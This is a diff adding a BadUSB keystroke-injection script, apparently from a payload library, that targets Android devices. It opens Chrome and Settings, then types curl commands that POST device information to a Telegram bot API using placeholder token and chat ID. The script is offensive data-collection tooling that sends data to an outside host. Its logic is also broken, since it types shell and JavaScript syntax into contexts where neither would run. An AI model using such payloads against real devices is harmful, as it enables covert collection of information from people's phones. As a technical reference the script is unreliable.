@@ -1,0 +1,42 @@
+REM Title: Android Device Info to Telegram
+REM Author: BadUSB Library
+REM Description: Sends device information to Telegram
+REM Target: Android 7.0+
+REM Category: Collection
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Browser
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Chrome
+ENTER
+DELAY 3000
+
+REM Navigate to device info site
+STRING https://www.whatismybrowser.com
+ENTER
+DELAY 3000
+
+REM Send device info to Telegram
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="Android Device Info: $(navigator.userAgent)"
+ENTER
+DELAY 2000
+
+REM Open Settings
+STRING Settings
+ENTER
+DELAY 2000
+
+STRING About phone
+ENTER
+DELAY 2000
+
+REM Send system info
+STRING curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="System Info: Android Device Connected"
+ENTER
+DELAY 2000
